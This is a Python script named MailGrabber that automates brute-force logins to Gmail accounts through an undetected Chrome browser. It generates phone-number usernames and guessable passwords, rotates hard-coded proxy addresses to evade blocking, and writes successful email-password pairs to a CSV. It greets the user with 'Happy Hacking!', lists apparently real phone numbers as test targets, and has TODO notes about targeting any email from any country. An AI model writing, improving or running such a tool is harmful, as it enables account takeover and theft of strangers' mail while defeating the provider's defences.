from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from time import sleep
import pandas as pd
from datetime import date, datetime
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import random
from src.const import PASSWORD_URL, GMAIL_URL, NEXT_BUTTON, SIGNIN_URL, INBOX_URL, EMAIL_FIELD, PASSWORD_FIELD, DONT_HAVE_PHONE


class MailGrabber(uc.Chrome):
    def __init__(self, driver=uc.Chrome, teardown=False, proxy=None):
        self.driver = driver
        self.teardown = teardown
        self.proxy = proxy
        self.show_intro()
        self.instructions()
        super(MailGrabber, self).__init__(options=self.get_chrome_options())

    def go_to_gmail(self, url):
        if url is not None:
            self.get(url)
        else:
            return None

    def get_chrome_options(self):
        chrome_options = Options()
        if self.proxy:
            chrome_options.add_argument("--window-size=720,1280")
            chrome_options.add_argument(f'--proxy-server={self.proxy}')
        return chrome_options

    def rotate_proxy(self):
        proxies = [
            'http://168.196.236.235:50100',
            'http://168.196.236.235:50101',
            'https://168.196.236.235:50105'
            'http://2.56.119.93:5074',
            'http://45.94.47.66:8110',
            'http://2.56.119.93:5074'
        ]
        self.proxy = random.choice(proxies)
        self.options = self.get_chrome_options()
        self.quit()  # close the current browser window
        super(MailGrabber, self).__init__(options=self.options)  # create a new browser instance

    def show_intro(self):
        text = "WELCOME TO MAILGRABBER"
        headline = text.upper().center(80)
        print('\033[32m' + headline + '\033[0m')

    def instructions(self):
        text = "DISCLAIMER"
        print(text.upper().center(80))
        print("1. Don't use same number everytime")
        print("2. Don't give a long try! It may causes issue")
        print("3. Happy Hacking!")
        print("")
        print("")

    def solve_captcha(self):
        pass

    @staticmethod
    def convert_to_dataframe(s_arr, f_arr):
        data_frame = pd.DataFrame({
            "Email": s_arr,
            "Password": f_arr
        })
        data_frame.to_csv(f"{datetime.now}.csv", index=False)

    def start_grabbing(self, x_path, number, amount, length_of_password):
        email_array = []
        password_array = []
        password_for_trying = []
        wait = WebDriverWait(self, 30)

        for i in range(0, amount):
            number = int(number) + 1
            number_str = "0{}".format(number)
            email_array.append(number_str)
            password_array.append(str(number_str)[:length_of_password])

        print("Chosen Emails: " + " " + str(email_array))
        for j in range(len(password_array)):
            password_for_trying.append(int(password_array[j]) + j)
        print("Chosen Passwords: " + " " + str(password_for_trying))

        email_field = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
        next_button = wait.until(EC.element_to_be_clickable((
            By.XPATH, NEXT_BUTTON
        )))

        while True:
            for email in email_array:
                email_field.click()
                email_field.send_keys(email)
                next_button.click()
                email_array.remove(email)
                email_field.clear()
                sleep(3)
                # >>>>>>>>>>
                password_field = wait.until(EC.visibility_of_element_located((
                    By.XPATH, PASSWORD_FIELD
                )))
                if PASSWORD_FIELD:
                    for p in password_for_trying:
                        password_field.click()
                        password_field.send_keys(p)
                        next_button.click()
                        sleep(3)
                        password_field.clear()
                        if DONT_HAVE_PHONE:
                            self.convert_to_dataframe(email, p)
                            self.get(GMAIL_URL)
                # <<<<<<<<<<<<<<<<<
            self.quit()


"""
for testing numbers
+18327321445
+13125860756
+17322496289
+19566222852
+12295853598
+13127424480
"""

# can target any email from any country


"""
1. Need to keep trying the loop until the arrays are empty | PENDING
2. If try again window comes up then press try again and continue trying where it lefts off | PENDING
3. If email or password matches then store it and show it | PENDING
4. can target any email from any country | PENDING
5. will need a function to add country code. | PENDING
6. need to make shorter and optimize code
"""